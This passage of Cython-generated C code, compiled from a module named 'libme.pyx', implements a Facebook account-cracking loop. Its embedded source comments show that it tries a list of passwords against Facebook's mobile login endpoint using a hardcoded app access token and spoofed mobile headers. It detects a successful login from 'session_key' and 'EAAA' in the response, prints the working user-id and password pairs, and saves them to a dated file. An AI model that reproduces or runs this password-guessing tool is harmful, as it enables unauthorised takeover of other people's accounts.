  PyTuple_SET_ITEM(__pyx_t_8, 3, __pyx_t_7);
  __pyx_t_2 = 0;
  __pyx_t_4 = 0;
  __pyx_t_6 = 0;
  __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyString_Format(__pyx_kp_s_s_s_ok_s_cp_s, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 298, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 297, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":299
 * 		sys.stdout.write(
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()             # <<<<<<<<<<<<<<
 * 		for pw in pwx:
 * 			pw = pw.lower()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sys); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 299, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_stdout); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 299, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_flush); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 299, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_7)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_7);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 299, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":300
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()
 * 		for pw in pwx:             # <<<<<<<<<<<<<<
 * 			pw = pw.lower()
 * 			ses = requests.Session()
 */
  if (likely(PyList_CheckExact(__pyx_v_pwx)) || PyTuple_CheckExact(__pyx_v_pwx)) {
    __pyx_t_1 = __pyx_v_pwx; __Pyx_INCREF(__pyx_t_1); __pyx_t_5 = 0;
    __pyx_t_9 = NULL;
  } else {
    __pyx_t_5 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_v_pwx); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 300, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_9 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 300, __pyx_L1_error)
  }
  for (;;) {
    if (likely(!__pyx_t_9)) {
      if (likely(PyList_CheckExact(__pyx_t_1))) {
        if (__pyx_t_5 >= PyList_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_3 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_5); __Pyx_INCREF(__pyx_t_3); __pyx_t_5++; if (unlikely(0 < 0)) __PYX_ERR(0, 300, __pyx_L1_error)
        #else
        __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 300, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        #endif
      } else {
        if (__pyx_t_5 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_3 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_5); __Pyx_INCREF(__pyx_t_3); __pyx_t_5++; if (unlikely(0 < 0)) __PYX_ERR(0, 300, __pyx_L1_error)
        #else
        __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 300, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        #endif
      }
    } else {
      __pyx_t_3 = __pyx_t_9(__pyx_t_1);
      if (unlikely(!__pyx_t_3)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 300, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_3);
    }
    __Pyx_XDECREF_SET(__pyx_v_pw, __pyx_t_3);
    __pyx_t_3 = 0;

    /* "libme.pyx":301
 * 		); sys.stdout.flush()
 * 		for pw in pwx:
 * 			pw = pw.lower()             # <<<<<<<<<<<<<<
 * 			ses = requests.Session()
 * 			headers = {
 */
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_pw, __pyx_n_s_lower); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 301, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
      __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_7);
      if (likely(__pyx_t_8)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
        __Pyx_INCREF(__pyx_t_8);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_7, function);
      }
    }
    __pyx_t_3 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 301, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF_SET(__pyx_v_pw, __pyx_t_3);
    __pyx_t_3 = 0;

    /* "libme.pyx":302
 * 		for pw in pwx:
 * 			pw = pw.lower()
 * 			ses = requests.Session()             # <<<<<<<<<<<<<<
 * 			headers = {
 * 				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
 */
    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_requests); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 302, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_Session); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 302, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_8);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_8, function);
      }
    }
    __pyx_t_3 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 302, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF_SET(__pyx_v_ses, __pyx_t_3);
    __pyx_t_3 = 0;

    /* "libme.pyx":304
 * 			ses = requests.Session()
 * 			headers = {
 * 				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),             # <<<<<<<<<<<<<<
 * 				"x-fb-sim-hni": str(random.randint(20000, 40000)),
 * 				"x-fb-net-hni": str(random.randint(20000, 40000)),
 */
    __pyx_t_3 = __Pyx_PyDict_NewPresized(8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 304, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_random); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 304, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_randint); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 304, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__23, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 304, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 304, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_fb_connection_bandwidth, __pyx_t_7) < 0) __PYX_ERR(0, 304, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

    /* "libme.pyx":305
 * 			headers = {
 * 				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
 * 				"x-fb-sim-hni": str(random.randint(20000, 40000)),             # <<<<<<<<<<<<<<
 * 				"x-fb-net-hni": str(random.randint(20000, 40000)),
 * 				"x-fb-connection-quality": "EXCELLENT",
 */
    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_random); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 305, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_randint); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 305, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_tuple__24, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 305, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 305, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_fb_sim_hni, __pyx_t_8) < 0) __PYX_ERR(0, 304, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

    /* "libme.pyx":306
 * 				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
 * 				"x-fb-sim-hni": str(random.randint(20000, 40000)),
 * 				"x-fb-net-hni": str(random.randint(20000, 40000)),             # <<<<<<<<<<<<<<
 * 				"x-fb-connection-quality": "EXCELLENT",
 * 				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
 */
    __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_random); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 306, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_randint); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 306, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__24, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 306, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 306, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_fb_net_hni, __pyx_t_7) < 0) __PYX_ERR(0, 304, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_fb_connection_quality, __pyx_n_s_EXCELLENT) < 0) __PYX_ERR(0, 304, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_fb_connection_type, __pyx_kp_s_cell_CTRadioAccessTechnologyHSDP) < 0) __PYX_ERR(0, 304, __pyx_L1_error)

    /* "libme.pyx":309
 * 				"x-fb-connection-quality": "EXCELLENT",
 * 				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
 * 				"user-agent": ua,             # <<<<<<<<<<<<<<
 * 				"content-type": "application/x-www-form-urlencoded",
 * 				"x-fb-http-engine": "Liger"
 */
    if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_user_agent, __pyx_v_ua) < 0) __PYX_ERR(0, 304, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_content_type, __pyx_kp_s_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 304, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_x_fb_http_engine, __pyx_n_s_Liger) < 0) __PYX_ERR(0, 304, __pyx_L1_error)
    __Pyx_XDECREF_SET(__pyx_v_headers, ((PyObject*)__pyx_t_3));
    __pyx_t_3 = 0;

    /* "libme.pyx":313
 * 				"x-fb-http-engine": "Liger"
 * 			}
 * 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)             # <<<<<<<<<<<<<<
 * 			if "session_key" in response.text and "EAAA" in response.text:
 * 				print("\r  \033[0;92m ~> %s|%s\033[0;97m         "%(uid, pw))
 */
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_get); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 313, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_uid); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 313, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = PyNumber_Add(__pyx_kp_s_https_b_api_facebook_com_method, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 313, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = PyNumber_Add(__pyx_t_8, __pyx_kp_s_password); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 313, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_pw); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 313, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_6 = PyNumber_Add(__pyx_t_7, __pyx_t_8); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 313, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = PyNumber_Add(__pyx_t_6, __pyx_kp_s_credentials_type_device_based_l); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 313, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_6 = PyTuple_New(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 313, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_GIVEREF(__pyx_t_8);
    PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_8);
    __pyx_t_8 = 0;
    __pyx_t_8 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 313, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 313, __pyx_L1_error)
    __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_6, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 313, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF_SET(__pyx_v_response, __pyx_t_7);
    __pyx_t_7 = 0;

    /* "libme.pyx":314
 * 			}
 * 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
 * 			if "session_key" in response.text and "EAAA" in response.text:             # <<<<<<<<<<<<<<
 * 				print("\r  \033[0;92m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))
 */
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_text); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 314, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_11 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_session_key, __pyx_t_7, Py_EQ)); if (unlikely(__pyx_t_11 < 0)) __PYX_ERR(0, 314, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_12 = (__pyx_t_11 != 0);
    if (__pyx_t_12) {
    } else {
      __pyx_t_10 = __pyx_t_12;
      goto __pyx_L6_bool_binop_done;
    }
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_text); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 314, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_12 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_EAAA, __pyx_t_7, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 314, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_11 = (__pyx_t_12 != 0);
    __pyx_t_10 = __pyx_t_11;
    __pyx_L6_bool_binop_done:;
    if (__pyx_t_10) {

      /* "libme.pyx":315
 * 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
 * 			if "session_key" in response.text and "EAAA" in response.text:
 * 				print("\r  \033[0;92m ~> %s|%s\033[0;97m         "%(uid, pw))             # <<<<<<<<<<<<<<
 * 				self.ok.append("%s|%s"%(uid, pw))
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 */
      __pyx_t_7 = PyTuple_New(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 315, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_v_pw);
      __pyx_t_8 = __Pyx_PyString_Format(__pyx_kp_s_0_92m_s_s_0_97m, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 315, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (__Pyx_PrintOne(0, __pyx_t_8) < 0) __PYX_ERR(0, 315, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      /* "libme.pyx":316
 * 			if "session_key" in response.text and "EAAA" in response.text:
 * 				print("\r  \033[0;92m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 */
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ok); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 316, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_7 = PyTuple_New(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 316, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_v_pw);
      __pyx_t_6 = __Pyx_PyString_Format(__pyx_kp_s_s_s, __pyx_t_7); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 316, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_13 = __Pyx_PyObject_Append(__pyx_t_8, __pyx_t_6); if (unlikely(__pyx_t_13 == ((int)-1))) __PYX_ERR(0, 316, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      /* "libme.pyx":317
 * 				print("\r  \033[0;92m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				break
 * 			elif "www.facebook.com" in response.json()["error_msg"]:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_date); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 317, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_7 = __Pyx_PyString_FormatSafe(__pyx_kp_s_OK_s_txt, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 317, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = PyTuple_New(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 317, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_GIVEREF(__pyx_t_7);
      PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_t_7);
      __Pyx_INCREF(__pyx_n_s_a);
      __Pyx_GIVEREF(__pyx_n_s_a);
      PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_n_s_a);
      __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_8, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 317, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_write); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 317, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = PyTuple_New(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 317, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_v_pw);
      __pyx_t_3 = __Pyx_PyString_Format(__pyx_kp_s_s_s_2, __pyx_t_7); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 317, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_6 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_7, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_3);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 317, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      /* "libme.pyx":318
